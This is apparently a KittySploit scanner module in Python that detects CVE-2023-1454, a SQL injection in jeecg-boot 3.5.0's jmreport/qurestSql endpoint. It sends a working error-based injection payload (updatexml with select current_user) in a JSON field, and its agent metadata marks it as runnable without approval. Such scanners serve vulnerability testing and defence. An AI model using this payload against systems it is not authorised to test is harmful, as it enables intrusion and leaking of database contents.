#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A vulnerability classified as critical has been found in jeecg-boot 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jeecg-boot 3.5.0 qurestSql - SQL Injection Detection',
        'description': 'A vulnerability classified as critical has been found in jeecg-boot 3.5.0. This affects an unknown part of the file jmreport/qurestSql. The manipulation of the argument apiSelectId leads to sql injection. It is possible to initiate the attack remotely.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve2023', 'cve', 'jeecg', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/Sweelg/CVE-2023-1454-Jeecg-Boot-qurestSql-SQLvuln/tree/master',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-1454',
            'https://vuldb.com/?ctiid.223299',
            'https://vuldb.com/?id.223299',
            'https://github.com/Awrrays/FrameVul',
        ],
        'cve': 'CVE-2023-1454',
    }

    def run(self):
        path = '/jeecg-boot/jmreport/qurestSql'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json;charset=UTF-8'}, data='{"apiSelectId":"1316997232402231298","id":"1\' or \'%1%\' like (updatexml(0x3a,concat(1,(select current_user)),1)) or \'%%\' like \'"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('SQLException', 'XPATH syntax error:',)
        header_any = ('application/json',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Jeecg-boot 3.5.0 qurestSql - SQL Injection detected', path=path)
            return True
        return False

